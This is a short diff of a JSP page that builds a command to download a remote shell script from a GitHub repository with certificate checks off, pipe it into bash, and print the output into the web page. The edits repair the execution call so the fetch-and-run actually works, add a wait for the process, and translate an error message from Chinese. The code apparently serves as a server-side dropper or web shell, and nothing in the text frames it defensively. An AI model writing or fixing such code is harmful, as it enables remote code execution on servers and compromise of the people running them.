@@ -7,7 +7,7 @@ String command = "bash <(curl -sLk https://github.com/momika233/test/raw/main/m.
 
 try {
 
-    Process process = Runtime.getRuntime().exec(command);
+    Process process = Runtime.getRuntime().exec(new String[]{"bash", "-c", command});
     
 
     BufferedReader reader = new BufferedReader(new InputStreamReader(process.getInputStream()));
@@ -17,10 +17,11 @@ try {
         output.append(line).append("\n");
     }
     
+    process.waitFor();
 
     out.println("<pre>" + output.toString() + "</pre>");
-} catch (IOException e) {
+} catch (IOException | InterruptedException e) {
 
-    out.println("执行命令时发生异常：" + e.getMessage());
+    out.println("An exception occurred while executing the command：" + e.getMessage());
 }
 %>
